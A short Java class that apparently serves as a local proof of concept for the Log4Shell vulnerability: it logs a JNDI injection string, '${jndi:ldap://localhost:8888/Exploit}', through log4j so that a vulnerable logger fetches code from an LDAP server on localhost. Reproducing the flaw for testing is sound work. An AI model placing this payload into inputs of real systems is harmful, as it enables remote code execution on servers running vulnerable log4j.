package com.tik.mysystem.system.main;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class MyMain {
    public static final Logger logger = LogManager.getLogger();
    public static void main(String[] args) {
        logger.error("${jndi:ldap://localhost:8888/Exploit}");
    }
}
